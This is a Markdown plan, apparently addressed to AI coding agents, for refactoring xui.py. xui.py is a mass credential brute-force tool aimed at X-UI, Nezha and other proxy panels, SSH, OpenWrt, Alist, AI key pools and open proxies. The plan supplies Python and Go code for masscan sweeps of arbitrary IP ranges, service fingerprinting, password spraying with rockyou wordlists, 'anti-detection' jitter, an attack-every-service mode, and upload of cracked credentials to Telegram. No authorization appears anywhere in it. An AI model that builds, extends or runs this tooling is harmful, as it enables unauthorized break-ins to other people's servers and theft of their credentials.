# Scan Tool Improvement Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Refactor xui.py so every scan mode (1-13, 15) follows: masscan port discovery → fingerprint verification → targeted credential testing. Mode 14 scans all service types.

**Architecture:** 4-phase incremental. Phase 1 fixes bugs. Phase 2 consolidates 13 Go templates into a single configurable engine. Phase 3 adds masscan + fingerprint to every mode. Phase 4 adds optimization (resume, dedup, rate-limit, multi-format export, parallel mode 14).

**Tech Stack:** Python 3.6+, Go 1.20+, masscan (external), Kali wordlists

---

## Current Codebase Analysis

### File: `xui.py` (4477 lines)
- 13 Go templates embedded as Python string constants
- 13 `generate_xui_go_template*` Python functions doing string replacement
- Batch processing: split input → run Go per batch → merge results
- Telegram bot upload (hardcoded token + chat ID)
- Environment setup (Go, pip, masscan) for Linux

### Key Differences Between Templates

| Template | Target | Method | Endpoint | Body Format | Success Check |
|----------|--------|--------|----------|-------------|---------------|
| 1 (XUI) | X-UI panel | POST | `/login` | form `username=X&password=X` | `success==true` |
| 2 (哪吒) | Nezha panel | POST | `/api/v1/login` | JSON `{"username","password"}` | `success==true` |
| 3 (HUI) | H-UI panel | POST | `/hui/auth/login` | JSON `{"username","pass"}` | `data.accessToken != ""` |
| 4 (咸蛋) | Xiandan panel | POST | `/login` | JSON `{"username","password"}` | `data.token != ""` |
| 5 (SUI) | S-UI panel | POST | `/app/api/login` | form `user=X&pass=X` | `success==true` |
| 6 (SSH) | SSH service | SSH | port 22 | SSH auth | login success + honeypot check |
| 7 (SubStore) | Sub Store | GET | various paths | none | body contains `{"status":"success","data"` |
| 8 (OpenWrt) | OpenWrt/iStoreOS | POST | `/cgi-bin/luci/` | form `luci_username=X&luci_password=X` | cookie `sysauth_http` |
| 9 (AI Key) | AI Key pool | POST | `/api/auth/login` | JSON `{"auth_key":"X"}` | `success==true` |
| 10 (alist) | Alist | GET | `/api/me` | none | JSON `code==200` |
| 11 (MiSub login) | MiSub | POST | `/api/login` | JSON `{"password":"X"}` | `success==true` |
| 12 (MiSub FP) | MiSub fingerprint | GET | various | none | title=="MiSub" + body keywords |
| 13 (Proxy) | Socks5/HTTP proxy | TCP | custom | protocol probe | protocol detection |
| 15 (Web FP) | Generic web fingerprint | GET | various + paths.txt | none | title keyword match |

### Critical Bugs Found

1. **`ioutil.ReadFile` deprecated** — all Go templates
2. **File write race condition** — no mutex in concurrent goroutines
3. **Telegram credentials hardcoded** — bot token + chat ID in plaintext
4. **Placeholder inconsistency** — `{pass_list}` vs `{{pass_list}}`
5. **No resp.Body.Close() in error paths**
6. **Template 6 double-counting** — `wg.Done()` called twice via timeout path
7. **Missing go.sum** — Go modules not initialized

---

## Phase 1: Bug Fixes (No Architecture Change)

### Task 1.1: Fix deprecated ioutil APIs in all Go templates

**Files:** Modify `xui.py` — all 13 `XUI_GO_TEMPLATE_*` constants

- [ ] **Step 1: Fix all templates**

In every template, replace:
- `ioutil.ReadFile(filename)` → `os.ReadFile(filename)`
- `ioutil.ReadAll(resp.Body)` → `io.ReadAll(resp.Body)`
- Update import blocks: remove `"io/ioutil"`, add `"io"` where missing

Templates affected: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15

---

### Task 1.2: Fix file write race conditions

**Files:** Modify `xui.py` — Go templates 1-5, 7-9, 11, 13

- [ ] **Step 1: Add sync.Mutex**

In each affected template, add to global vars:
```go
var fileMu sync.Mutex
```

Wrap `writeResultToFile`:
```go
func writeResultToFile(file *os.File, text string) {
    fileMu.Lock()
    defer fileMu.Unlock()
    file.WriteString(text)
}
```

Templates already safe: 10 (has `outMu`), 12 (has `outMu`), 15 (has `outMu`)

---

### Task 1.3: Fix response body leaks

**Files:** Modify `xui.py` — Go templates 1-5, 8-9, 11

- [ ] **Step 1: Add resp.Body.Close() in all code paths**

Pattern:
```go
resp, err := postRequest(ctx, url, username, password)
if err != nil {
    continue
}
body, _ := io.ReadAll(resp.Body)
resp.Body.Close()
```

---

### Task 1.4: Extract hardcoded Telegram credentials

**Files:** Modify `xui.py:4449-4450`

- [ ] **Step 1: Add config file loading**

```python
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

if os.path.exists("telegram_config.txt"):
    with open("telegram_config.txt", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line.startswith("BOT_TOKEN="):
                TELEGRAM_BOT_TOKEN = line.split("=", 1)[1]
            elif line.startswith("CHAT_ID="):
                TELEGRAM_CHAT_ID = line.split("=", 1)[1]
```

- [ ] **Step 2: Use config variables**

Replace hardcoded values and skip upload if not configured.

---

### Task 1.5: Fix Template 6 double-counting

**Files:** Modify `xui.py` — `XUI_GO_TEMPLATE_6`

- [ ] **Step 1: Use atomic flag for cleanup**

```go
var cleaned int32

// In inner goroutine defer:
defer func() {
    if atomic.CompareAndSwapInt32(&cleaned, 0, 1) {
        atomic.AddInt64(&completedCount, 1)
        <-semaphore
        wg.Done()
    }
}()

// In timeout select:
case <-time.After(30 * time.Second):
    if atomic.CompareAndSwapInt32(&cleaned, 0, 1) {
        atomic.AddInt64(&completedCount, 1)
        <-semaphore
        wg.Done()
    }
```

---

## Phase 2: Consolidate Templates into Configurable Engine

### Task 2.1: Define per-mode config with default ports and fingerprints

**Files:**
- Create: `scanner/configs/*.json` — one config per scan mode

**Design:**
Each config defines: scan type, default ports, fingerprint signature, HTTP request template, success check.

```json
{
  "scan_type": "xui",
  "name": "X-UI面板爆破",
  "default_ports": [2053, 54321],
  "fingerprint": {
    "probe_paths": ["/login"],
    "check": "body_contains",
    "keywords": ["x-ui", "X-UI"]
  },
  "endpoint": "/login",
  "method": "POST",
  "content_type": "form",
  "body_template": "username={user}&password={pass}",
  "success_check": {
    "type": "json_field",
    "field": "success",
    "value": true
  },
  "fallback_protocols": ["http", "https"],
  "timeout_seconds": 3
}
```

- [ ] **Step 1: Create all config files**

| Config File | Mode | 默认端口 | 指纹探针 | 匹配规则 |
|-------------|------|----------|----------|----------|
| `xui.json` | 1 | 2053, 54321 | GET `/login` | body含`x-ui`/`X-UI` |
| `nezha.json` | 2 | 8008 | POST `/api/v1/login` | JSON `success==true` |
| `hui.json` | 3 | 8081 | POST `/hui/auth/login` | JSON含`accessToken` |
| `xiandan.json` | 4 | 用户输入 | POST `/login` | JSON含`data.token` |
| `sui.json` | 5 | 2095 | POST `/app/api/login` | JSON `success==true` |
| `ssh.json` | 6 | 22 | TCP banner | `SSH-`开头 |
| `substore.json` | 7 | 3000, 3001 | GET `/{path}/api/utils/env` (3000) / GET `/` (3001) | 后端:`{"status":"success","data"` / 前端:title含"Sub Store" |
| `openwrt.json` | 8 | 80, 8443 | POST `/cgi-bin/luci/` | title含`OpenWrt`/`iStoreOS`/`LuCI` |
| `aikey.json` | 9 | 用户输入 | POST `/api/auth/login` | JSON `success==true` |
| `alist.json` | 10 | 5244 | GET `/api/me` | JSON `code==200` |
| `misub_login.json` | 11 | 25556 | POST `/api/login` | JSON `success==true` |
| `misub_fp.json` | 12 | 25556 | GET `/` | title含"MiSub" |
| `proxy.json` | 13 | 用户指定 | TCP连接探测 | 协议特征识别 |
| `web_fp.json` | 15 | 80,443,8080,8443,3000,5000,8000,8888,9000 | GET `/` + paths.txt | title关键词匹配 |

**注意：** 模式4(咸蛋)和模式9(AI Key池)无固定默认端口，每次运行时由用户手动输入。

---

### Task 2.2: Write the unified Go engine

**Files:**
- Create: `scanner/go.mod`
- Create: `scanner/main.go`
- Create: `scanner/engine/config.go`
- Create: `scanner/engine/http_scan.go`
- Create: `scanner/engine/ssh_scan.go`
- Create: `scanner/engine/proxy_scan.go`
- Create: `scanner/engine/common.go`

- [ ] **Step 1: Create config.go** — JSON config loading
- [ ] **Step 2: Create common.go** — progress tracking, batch processing, mutex-protected file I/O
- [ ] **Step 3: Create http_scan.go** — HTTP scanning engine (covers modes 1-5, 7-13, 15)
- [ ] **Step 4: Create ssh_scan.go** — SSH scanning with honeypot detection (mode 6)
- [ ] **Step 5: Create proxy_scan.go** — TCP proxy detection (mode 13)
- [ ] **Step 6: Create main.go** — entry point: reads `scan_config.json` + `results.txt`, routes to correct engine

---

### Task 2.3: Update Python driver to use unified engine

**Files:** Modify `xui.py`

- [ ] **Step 1: Replace 13 generator functions with one config loader**

```python
TEMPLATE_CONFIGS = {
    1: "configs/xui.json", 2: "configs/nezha.json", 3: "configs/hui.json",
    4: "configs/xiandan.json", 5: "configs/sui.json", 6: "configs/ssh.json",
    7: "configs/substore.json", 8: "configs/openwrt.json", 9: "configs/aikey.json",
    10: "configs/alist.json", 11: "configs/misub_login.json", 12: "configs/misub_fp.json",
    13: "configs/proxy.json", 15: "configs/web_fp.json",
}

def generate_scan_config(template_mode, usernames, passwords, **kwargs):
    import json
    with open(TEMPLATE_CONFIGS[template_mode], encoding='utf-8') as f:
        config = json.load(f)
    config["usernames"] = usernames
    config["passwords"] = passwords
    config.update(kwargs)
    with open("scan_config.json", "w", encoding="utf-8") as f:
        json.dump(config, f, ensure_ascii=False, indent=2)
```

- [ ] **Step 2: Update run_xui_for_parts to call `go run scanner/main.go`**
- [ ] **Step 3: Remove all XUI_GO_TEMPLATE_* constants (~3500 lines)**

---

## Phase 3: Masscan + Fingerprint for Every Mode

### Task 3.1: Add masscan wrapper

**Files:**
- Create: `masscan_scan.py`

- [ ] **Step 1: Create masscan wrapper**

```python
def run_masscan(targets, ports="22,80,443,8080,8443", rate=1000, output_file="masscan_results.txt"):
    """Run masscan, return list of ip:port strings."""
    # Write targets to temp file if list
    # Execute: masscan -iL <targets> -p <ports> --rate <rate> -oL <output> --open
    # Parse -oL output → ["192.168.1.1:80", "192.168.1.1:443", ...]
```

- [ ] **Step 2: Create masscan availability check**

```python
def check_masscan():
    import shutil
    return shutil.which("masscan") is not None
```

---

### Task 3.2: Add fingerprint verification module

**Files:**
- Create: `fingerprint.py`

- [ ] **Step 1: Create fingerprint probe function**

```python
def fingerprint_target(ip_port, config, timeout=3):
    """
    Probe ip:port against a specific config's fingerprint rules.
    Returns True if fingerprint matches, False otherwise.
    """
    # SSH: connect, read banner, check for "SSH"
    # HTTP: request probe_paths, check body/title/keywords per config
```

- [ ] **Step 2: Create batch fingerprint function**

```python
def fingerprint_batch(targets, config, timeout=3):
    """Filter targets list to only those matching the config's fingerprint."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    matched = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(fingerprint_target, t, config, timeout): t for t in targets}
        for future in as_completed(futures):
            target = futures[future]
            if future.result():
                matched.append(target)
    return matched
```

---

### Task 3.3: Redesign main flow — every mode uses masscan + fingerprint

**Files:** Modify `xui.py` — main entry point and `run_xui_for_parts`

**New flow for every mode (1-13, 15):**

```
1. User selects mode (e.g., 1 = XUI)
2. System loads that mode's config → gets default_ports + fingerprint rules
3. System asks: "请输入扫描目标（IP/CIDR/文件路径）："
4. System asks: "端口范围（默认从配置读取）："
5. System runs masscan → discovers ip:port list
6. System fingerprints each discovered target against THIS mode's fingerprint
7. Only matched targets proceed to credential testing
8. Unmatched targets reported: "N 个目标未通过指纹验证，已跳过"
```

- [ ] **Step 1: Create unified run_pipeline function**

```python
def run_pipeline(mode):
    """Unified flow: target input → masscan → fingerprint → scan."""
    import json
    
    # Load config for this mode
    with open(TEMPLATE_CONFIGS[mode], encoding='utf-8') as f:
        config = json.load(f)
    
    default_ports = ",".join(str(p) for p in config["default_ports"])
    
    # Step 1: Get target
    target_input = input("请输入扫描目标（IP/CIDR/文件路径）：").strip()
    
    # Step 2: Get ports
    ports = input(f"端口范围（默认 {default_ports}）：").strip()
    if not ports:
        ports = default_ports
    
    rate = input_with_default("masscan发包速率", 1000)
    
    # Step 3: Masscan
    print(f">>> Phase 1: Masscan 端口扫描（{config['name']}）...")
    discovered = run_masscan(target_input, ports, rate)
    print(f">>> 发现 {len(discovered)} 个开放端口")
    
    if not discovered:
        print("未发现开放端口，退出")
        return
    
    # Step 4: Fingerprint
    print(">>> Phase 2: 指纹验证...")
    matched = fingerprint_batch(discovered, config)
    skipped = len(discovered) - len(matched)
    print(f">>> 指纹验证通过: {len(matched)} 个 | 未通过: {skipped} 个")
    
    if not matched:
        print("无目标通过指纹验证，退出")
        return
    
    # Step 5: Credential testing
    print(">>> Phase 3: 爆破...")
    usernames, passwords = load_credentials()
    
    with open("results.txt", "w") as f:
        f.write("\n".join(matched) + "\n")
    
    generate_scan_config(mode, usernames, passwords)
    subprocess.run(['go', 'run', 'scanner/main.go'], check=True)
```

- [ ] **Step 2: Update main entry point**

Replace the current `if TEMPLATE_MODE == N: generate_xui_go_templateN(...)` block with:

```python
if __name__ == "__main__":
    TEMPLATE_MODE = choose_template_mode()
    
    if TEMPLATE_MODE == 14:
        # Mode 14: scan ALL service types
        run_pipeline_all()
    else:
        # Mode 1-13, 15: scan specific service type
        run_pipeline(TEMPLATE_MODE)
```

- [ ] **Step 3: Implement mode 14 (all services)**

```python
def run_pipeline_all():
    """Mode 14: masscan → fingerprint ALL types → run each."""
    target_input = input("请输入扫描目标（IP/CIDR/文件路径）：").strip()
    ports = input("端口范围（默认所有常用端口）：").strip()
    if not ports:
        ports = "22,80,443,3000,5000,5244,5245,8000,8080,8081,8443,8888,9000,2022,2048,2053,2083,2087,2096,25556,25560,25562"
    
    rate = input_with_default("masscan发包速率", 1000)
    
    # Masscan
    discovered = run_masscan(target_input, ports, rate)
    
    # Fingerprint against ALL configs
    all_results = {}
    for mode_num, config_path in TEMPLATE_CONFIGS.items():
        with open(config_path, encoding='utf-8') as f:
            config = json.load(f)
        matched = fingerprint_batch(discovered, config)
        if matched:
            all_results[mode_num] = (config, matched)
    
    # Run each matched scan
    for mode_num, (config, targets) in all_results.items():
        print(f"\n--- {config['name']} ({len(targets)} 个目标) ---")
        usernames, passwords = load_credentials()
        with open("results.txt", "w") as f:
            f.write("\n".join(targets) + "\n")
        generate_scan_config(mode_num, usernames, passwords)
        subprocess.run(['go', 'run', 'scanner/main.go'], check=True)
```

- [ ] **Step 4: Update menu**

```python
def choose_template_mode():
    print("请选择爆破模式：")
    print("1.XUI面板爆破  2.哪吒面板爆破  3.HUI面板爆破  4.咸蛋面板爆破")
    print("5.SUI面板爆破  6.SSH爆破       7.Sub Store爆破  8.OpenWrt/iStoreOS爆破")
    print("9.AI Key池爆破  10.alist爆破    11.MiSub爆破     12.MiSub指纹海选")
    print("13.Socks5或HTTP代理海选        14.全服务自动爆破")
    print("15.通用Web标题指纹海选分类")
    # ... input handling
```

---

### Task 3.4: Add Kali wordlist integration

**Files:** Modify `xui.py` — `load_credentials()`

- [ ] **Step 1: Add Kali wordlist detection**

```python
KALI_WORDLISTS = {
    "usernames": [
        "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
        "/usr/share/wordlists/metasploit/unix_users.txt",
    ],
    "passwords": [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-1000.txt",
    ]
}

def find_kali_wordlist(category):
    import os
    for path in KALI_WORDLISTS.get(category, []):
        if os.path.exists(path):
            return path
    return None
```

- [ ] **Step 2: Offer Kali wordlists after custom dictionary prompt**

---

### Task 3.5: Clean up and document

- [ ] **Step 1: Remove dead code** — all `XUI_GO_TEMPLATE_*` constants, all `generate_xui_go_template*` functions
- [ ] **Step 2: Update guide.md** with new workflow

---

## Phase 3 Single-Mode Flow Diagram

```
用户选模式 1 (XUI)
       │
       ▼
加载 configs/xui.json → default_ports=[2053, 54321]
       │
       ▼
输入目标: 192.168.1.0/24
       │
       ▼
masscan -p 2053,54321
       │
       ▼
发现 47 个开放端口
       │
       ▼
指纹验证: 请求每个目标的 /login，检查 body 是否包含 "x-ui"
       │
       ├── 通过: 8 个 (确认是 X-UI 面板)
       └── 未通过: 39 个 (不是 X-UI，跳过)
              │
              ▼
       对 8 个目标执行 X-UI 爆破
              │
              ▼
       结果: XUI-20260916-1145.txt
```

---

## Phase 4: Optimization Enhancements

### Task 4.1: Scan resume capability (--resume)

**Files:**
- Modify: `scanner/main.go`
- Modify: `xui.py` — pass `--resume` flag when restarting

- [ ] **Step 1: Add progress file tracking in Go**

```go
type ScanProgress struct {
    CompletedIPs []string `json:"completed_ips"`
    Results      []string `json:"results"`
}

func loadProgress(filename string) *ScanProgress {
    data, err := os.ReadFile(filename)
    if err != nil {
        return &ScanProgress{}
    }
    var p ScanProgress
    json.Unmarshal(data, &p)
    return &p
}

func saveProgress(filename string, p *ScanProgress) {
    data, _ := json.MarshalIndent(p, "", "  ")
    fileMu.Lock()
    defer fileMu.Unlock()
    os.WriteFile(filename, data, 0644)
}
```

- [ ] **Step 2: Skip completed IPs in main scan loop**

```go
progress := loadProgress("scan.progress")
completedSet := make(map[string]bool)
for _, ip := range progress.CompletedIPs {
    completedSet[ip] = true
}

// In scan loop:
if completedSet[target] {
    continue // already done, skip
}
// After processing:
progress.CompletedIPs = append(progress.CompletedIPs, target)
saveProgress("scan.progress", progress)
```

- [ ] **Step 3: Add --resume flag to main.go**

```go
var resumeFlag = flag.Bool("resume", false, "Resume from last progress")

func main() {
    flag.Parse()
    if *resumeFlag {
        // Load progress, skip completed
    }
    // ... rest of scan
}
```

- [ ] **Step 4: Python driver passes --resume when resuming**

```python
def run_scan(resume=False):
    cmd = ['go', 'run', 'scanner/main.go']
    if resume:
        cmd.append('--resume')
    subprocess.run(cmd, check=True)
```

- [ ] **Step 5: Clean up progress file after successful completion**

```go
// After scan completes successfully:
os.Remove("scan.progress")
```

---

### Task 4.2: Result deduplication across ports

**Files:**
- Modify: `scanner/main.go`

- [ ] **Step 1: Add credential deduplication map**

```go
type ResultDeduplicator struct {
    mu      sync.Mutex
    seen    map[string]bool // key: "user:pass:ip"
    results []string
}

func NewDeduplicator() *ResultDeduplicator {
    return &ResultDeduplicator{
        seen: make(map[string]bool),
    }
}

func (d *ResultDeduplicator) Add(ip, user, pass, extra string) bool {
    d.mu.Lock()
    defer d.mu.Unlock()
    key := fmt.Sprintf("%s:%s:%s", ip, user, pass)
    if d.seen[key] {
        return false // duplicate
    }
    d.seen[key] = true
    d.results = append(d.results, fmt.Sprintf("%s - %s:%s%s", ip, user, pass, extra))
    return true
}

func (d *ResultDeduplicator) GetAll() []string {
    d.mu.Lock()
    defer d.mu.Unlock()
    return append([]string{}, d.results...)
}
```

- [ ] **Step 2: Use deduplicator in writeResultToFile**

```go
var dedup = NewDeduplicator()

// In credential testing loop:
if dedup.Add(ip, username, password, extraInfo) {
    writeResultToFile(resultFile, fmt.Sprintf("%s - %s:%s\n", ip, username, password))
}
```

---

### Task 4.3: Rate limiting and anti-detection

**Files:**
- Modify: `scanner/main.go`

- [ ] **Step 1: Add rate limiter**

```go
type RateLimiter struct {
    ticker    *time.Ticker
    maxPerSec int
}

func NewRateLimiter(maxPerSec int) *RateLimiter {
    interval := time.Second / time.Duration(maxPerSec)
    return &RateLimiter{
        ticker:    time.NewTicker(interval),
        maxPerSec: maxPerSec,
    }
}

func (r *RateLimiter) Wait() {
    <-r.ticker.C
}
```

- [ ] **Step 2: Add random delay jitter**

```go
func randomDelay(minMs, maxMs int) time.Duration {
    ms := minMs + rand.Intn(maxMs-minMs+1)
    return time.Duration(ms) * time.Millisecond
}

// In scan loop:
limiter.Wait()
time.Sleep(randomDelay(100, 500)) // 100-500ms random jitter
```

- [ ] **Step 3: Add configurable max concurrent requests**

```go
var maxConcurrent = flag.Int("c", 50, "max concurrent requests")

// In main:
semaphore := make(chan struct{}, *maxConcurrent)
```

- [ ] **Step 4: Add rate limit config to JSON**

```json
{
  "rate_limit": {
    "max_per_second": 100,
    "jitter_ms": [100, 500],
    "max_concurrent": 50
  }
}
```

---

### Task 4.4: Multi-format export (JSON/CSV)

**Files:**
- Modify: `scanner/main.go`

- [ ] **Step 1: Define result struct**

```go
type ScanResult struct {
    IP        string `json:"ip"`
    Port      int    `json:"port"`
    Username  string `json:"username"`
    Password  string `json:"password"`
    Protocol  string `json:"protocol"`
    Timestamp string `json:"timestamp"`
    Service   string `json:"service"`
}
```

- [ ] **Step 2: Add JSON export**

```go
func exportJSON(results []ScanResult, filename string) {
    data, _ := json.MarshalIndent(results, "", "  ")
    os.WriteFile(filename, data, 0644)
}
```

- [ ] **Step 3: Add CSV export**

```go
func exportCSV(results []ScanResult, filename string) {
    f, _ := os.Create(filename)
    defer f.Close()
    w := csv.NewWriter(f)
    defer w.Flush()
    w.Write([]string{"IP", "Port", "Username", "Password", "Protocol", "Timestamp", "Service"})
    for _, r := range results {
        w.Write([]string{r.IP, strconv.Itoa(r.Port), r.Username, r.Password, r.Protocol, r.Timestamp, r.Service})
    }
}
```

- [ ] **Step 4: Add export format config**

```go
var exportFormat = flag.String("format", "txt", "export format: txt, json, csv")

// After scan:
switch *exportFormat {
case "json":
    exportJSON(results, "results.json")
case "csv":
    exportCSV(results, "results.csv")
default:
    exportTXT(results, "results.txt")
}
```

- [ ] **Step 5: Python driver asks export format**

```python
def ask_export_format():
    fmt = input_with_default("导出格式 (txt/json/csv)", "txt")
    return fmt
```

---

### Task 4.5: Mode 14 parallel scanning across service types

**Files:** Modify `xui.py` — `run_pipeline_all()`

- [ ] **Step 1: Run all service types in parallel using threads**

```python
def run_pipeline_all():
    target_input = input("请输入扫描目标（IP/CIDR/文件路径）：").strip()
    ports = input("端口范围（默认所有常用端口）：").strip()
    if not ports:
        ports = "22,80,443,3000,5000,5244,5245,8000,8080,8081,8443,8888,9000,2022,2048,2053,2083,2087,2096,25556,25560,25562"
    
    rate = input_with_default("masscan发包速率", 1000)
    
    # Masscan (once for all services)
    discovered = run_masscan(target_input, ports, rate)
    
    # Fingerprint against ALL configs in parallel
    from concurrent.futures import ThreadPoolExecutor, as_completed
    all_results = {}
    
    def check_service(mode_num, config_path):
        with open(config_path, encoding='utf-8') as f:
            config = json.load(f)
        matched = fingerprint_batch(discovered, config)
        return (mode_num, config, matched) if matched else None
    
    with ThreadPoolExecutor(max_workers=len(TEMPLATE_CONFIGS)) as executor:
        futures = {
            executor.submit(check_service, mode, path): mode
            for mode, path in TEMPLATE_CONFIGS.items()
        }
        for future in as_completed(futures):
            result = future.result()
            if result:
                mode_num, config, matched = result
                all_results[mode_num] = (config, matched)
                print(f"  [+] {config['name']}: {len(matched)} 个目标")
    
    # Run each matched scan sequentially (to avoid resource contention)
    for mode_num, (config, targets) in sorted(all_results.items()):
        print(f"\n--- {config['name']} ({len(targets)} 个目标) ---")
        usernames, passwords = load_credentials()
        with open("results.txt", "w") as f:
            f.write("\n".join(targets) + "\n")
        generate_scan_config(mode_num, usernames, passwords)
        subprocess.run(['go', 'run', 'scanner/main.go'], check=True)
```

---

## Execution Order

Phase 1 → Phase 2 → Phase 3 → Phase 4，共 21 个 Task。

| Phase | Tasks | Description |
|-------|-------|-------------|
| Phase 1 | 1.1-1.5 | Bug fixes (ioutil, race condition, resp body, telegram creds, double-count) |
| Phase 2 | 2.1-2.3 | Consolidate 13 templates into configurable engine |
| Phase 3 | 3.1-3.5 | Masscan + fingerprint for every mode |
| Phase 4 | 4.1-4.5 | Optimization (resume, dedup, rate-limit, multi-format, parallel mode 14) |
